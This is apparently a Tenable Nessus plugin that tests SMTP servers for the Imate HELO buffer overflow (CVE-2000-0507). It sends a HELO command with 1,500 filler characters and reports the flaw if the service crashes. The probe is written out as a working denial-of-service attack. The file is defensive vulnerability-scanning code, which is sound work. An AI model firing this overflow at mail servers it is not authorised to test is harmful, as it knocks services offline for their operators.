#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");

if(description)
{
 script_id(10435);
 script_version ("$Revision: 1.25 $");

 script_cve_id("CVE-2000-0507");
 script_bugtraq_id(1286);
 script_osvdb_id(337);

 script_name(english:"Imate SMTP Server HELO Command Remote Overflow DoS");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote SMTP server is affected by a remote denial of service
vulnerability." );
 script_set_attribute(attribute:"description", value:
"The remote SMTP server crashes when it is issued a HELO command with
an argument longer than 1200 chars.

This problem may allow an attacker to shut down your SMTP server." );
 script_set_attribute(attribute:"see_also", value:"http://marc.info/?l=bugtraq&m=95990195708509&w=2" );
 script_set_attribute(attribute:"solution", value:
"Apply patches available from the vendor." );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:N/I:N/A:P");
 script_set_cvss_temporal_vector("CVSS2#E:H/RL:OF/RC:C");
 script_set_attribute(attribute:"plugin_publication_date", value: "2000/06/06");
 script_set_attribute(attribute:"vuln_publication_date", value: "2000/06/01");
 script_cvs_date("$Date: 2011/03/11 21:52:34 $");
 script_set_attribute(attribute:"plugin_type", value:"remote");
 script_end_attributes();
 
 script_summary(english:"Checks if the remote mail server can be oveflown"); 
 
 script_category(ACT_DESTRUCTIVE_ATTACK);
 
 script_copyright(english:"This script is Copyright (C) 2000-2011 Tenable Network Security, Inc.");
 
 script_family(english:"SMTP problems");
 script_dependencie("smtpserver_detect.nasl", "sendmail_expn.nasl");
 script_require_ports("Services/smtp", 25);
 exit(0);
}

#
# The script code starts here
#

include("global_settings.inc");
include("misc_func.inc");
include("smtp_func.inc");

port = get_service(svc: "smtp", default: 25, exit_on_fail: 1);
if (get_kb_item('SMTP/'+port+'/broken')) exit(0);

soc = open_sock_tcp(port);
if (! soc) exit(1);

data = smtp_recv_banner(socket:soc);
crp = "HELO " + crap(1500) + '\r\n';
 send(socket:soc, data:crp);
 data = recv_line(socket:soc, length:4);
 close(soc);
 
if (service_is_dead(port: port, exit: 1) > 0)
  security_warning(port);
